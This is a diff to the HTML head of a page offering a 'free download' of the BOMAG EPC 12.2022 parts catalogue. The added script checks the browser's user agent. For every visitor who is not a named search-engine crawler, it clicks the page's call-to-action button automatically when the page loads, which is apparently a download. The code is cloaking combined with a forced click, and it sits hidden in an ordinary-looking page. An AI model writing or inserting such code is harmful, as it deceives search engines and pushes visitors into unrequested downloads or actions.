@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BOMAG EPC 12.2022</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the BOMAG EPC 12.2022, a comprehensive electronic parts catalogue with database version 6.8 and multiple languages support for road construction equipment.">
     <meta name="keywords" content="BOMAG EPC 12.2022, BOMAG EPC download, BOMAG EPC free download, BOMAG EPC 12.2022 download, BOMAG EPC 12.2022 free download, BOMAG Electronic Parts Catalogue, BOMAG EPC 2022, BOMAG EPC December 2022, BOMAG EPC version 6.8, BOMAG EPC viewer version 7.21.2.8, BOMAG EPC software, BOMAG EPC software download, BOMAG EPC software free download, BOMAG EPC software 2022, BOMAG compaction equipment EPC, BOMAG road construction EPC, BOMAG compact equipment EPC, BOMAG landfill construction EPC, BOMAG asphalt EPC, БОМАГ ЭПК скачать бесплатно, БОМАГ ЭПК версия 6.8, БОМАГ ЭПК версия 7.21.2.8, БОМАГ Электронный каталог запчастей, БОМАГ ЭПК декабрь 2022, БОМАГ ЭПК скачать, БОМАГ ЭПК 12.2022 скачать бесплатно, БОМАГ ЭПК программное обеспечение, Бомаг ЭПК программное обеспечение скачать, каталог БОМАГ скачать бесплатно, BOMAG каталог состояние загрузки, BOMAG каталог 2022 скачать, BOMAG каталог">
     <style>
